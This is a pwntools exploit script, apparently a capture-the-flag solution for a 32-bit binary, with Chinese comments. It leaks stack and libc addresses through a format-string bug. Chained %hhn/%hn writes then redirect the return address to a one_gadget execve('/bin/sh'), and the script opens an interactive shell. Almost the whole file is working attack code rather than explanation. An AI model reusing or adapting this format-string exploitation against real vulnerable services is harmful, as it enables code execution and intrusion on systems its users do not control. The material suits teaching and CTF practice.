from pwn import *
from LibcSearcher import *
context.terminal=['tmux','splitw','-h']
#context(os='linux', arch='amd64', kernel='amd64',log_level='debug')
context(os='linux', arch='i386', kernel='i386',log_level='debug')
#io=gdb.debug('./pwn')
#io=process('./pwn')
#io=remote('node4.buuoj.cn',)
io=gdb.debug('./pwn','''
b *0x0804853B
b *0x08048547
b *0x08048510
''')
s,sl,sa,sla = io.send, io.sendline, io.sendafter, io.sendlineafter
r, ra, rl, ru = io.recv, io.recvall, io.recvline, io.recvuntil
ii=io.interactive

#io=process('./pwn')
libc=ELF('./libc.so.6')
elf=ELF('./pwn')
def fl():
    ru(b'flag')

def lg(var):
    for name, value in globals().items():
        if value is var:
            log.info(f"{name} => {hex(var)}")
            return





ru(b'=====================')
#泄露栈地址和偏移地址
sl(b'stack%6$pmain%15$pflag\x00')
ru(b'stack0x')
stack= int(r(8),16)+0x24
lg(stack)
ru(b'main0x')
main=int(r(8),16)
libcbase= main-0x1aed5
lg(libcbase)
onegetadd=libcbase+0x14482c#0xc9bbb
#0x14482c#+0x14482b
lg(onegetadd)
word=stack&0xff
fl()

payload1=f'%{word}c%6$hhnflag\x00'

payload1=payload1.encode()
sl(payload1)
#check()
fl()




#06:0018│ ebp 0xffffd3f8 —▸ 0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10
#这时候需要对08进行操作



#0a:0028│     0xffffd408 —▸ 0xffffd41c —▸ 0xf7de2ed5 (__libc_start_main+245) ◂— add esp, 0x10


#先修改最后两个字节
word=onegetadd&0xffff

payload2=f'%{word}c%10$hnflag\x00'

payload2=payload2.encode()
sl(payload2)
#check()
fl()
#还有一个字节没有修改
#我们还得让stack+2的地址出现在三级指针上

#check()

#sleep(3)








print('stack·+2出现在三级指针位置开始')
word=stack+2
word=word&0xff
print(f'第二次改一个字节word--->{hex(word)}')
payload3=f'%{word}c%6$hhnflag\x00'
payload3=payload3.encode()
sl(payload3)
fl()
print('stack·+2出现在三级指针位置结束')






print('修改stack+2的地址开始')
#check()
#修改最后一个字节
#word=onegetadd&0xffffff
#word=word>>8
word=onegetadd>>16
word=word&0xff
payload4=f'%{word}c%10$hhnflag\x00'
payload4=payload4.encode()
sl(payload4)
print('修改stack+2的地址结束')
fl()
#check()



#修复ebp
#print(hex(stack))
print('恢复栈底开始')

word=stack-0x14
word=word&0xff
payload5=f'%{word}c%6$hhnflag\x00'

payload5=payload5.encode()
sl(payload5)
fl()
print('恢复栈底结束')
#check()
#gdb.attach(io,'''
#b *0x0804853B
#''')
#pause()
print('''0xc9bbb execve("/bin/sh", [ebp-0x2c], esi)
      constraints:
        address ebp-0x20 is writable
        ebx is the GOT address of libc
        [[ebp-0x2c]] == NULL || [ebp-0x2c] == NULL
        [esi] == NULL || esi == NULL

      0x14482b execl("/bin/sh", eax)
      constraints:
        ebp is the GOT address of libc
        eax == NULL

      0x14482c execl("/bin/sh", [esp])
      constraints:
        ebp is the GOT address of libc
        [esp] == NULL
      ''')

sl(b'quit\x00')



ii()
